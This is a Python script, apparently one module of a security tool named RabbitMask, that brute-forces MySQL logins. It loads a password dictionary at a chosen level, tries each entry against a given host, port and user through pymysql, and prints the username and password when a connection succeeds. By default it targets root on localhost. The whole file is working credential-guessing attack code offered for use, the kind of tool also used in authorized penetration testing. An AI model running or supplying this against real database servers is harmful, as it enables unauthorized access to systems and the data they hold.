#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
'''
 ____       _     _     _ _   __  __           _
|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\
'''
import pymysql

from Dictionaries.level_dic import Level_dic


def Mysql_crack(ip,port,user,lv):
    pwds=Level_dic(lv)
    print('字典加载成功：{}条'.format(len(pwds)))
    for i in pwds:
        i=i.replace('\n','')
        print('Cracking ：'+i)
        try:
            db = pymysql.connect(
                host=str(ip),
                port=int(port),
                user=str(user),
                passwd=i,
            )
            print("Cracks Sussess!\nusername: {}\npassword: {}".format(user,i))
            break
        except:
            pass

def run(ip,port,user,lv):
    Mysql_crack(ip, port, user, lv)



if __name__ == '__main__':
    Mysql_crack('127.0.0.1',3306,'root',1)
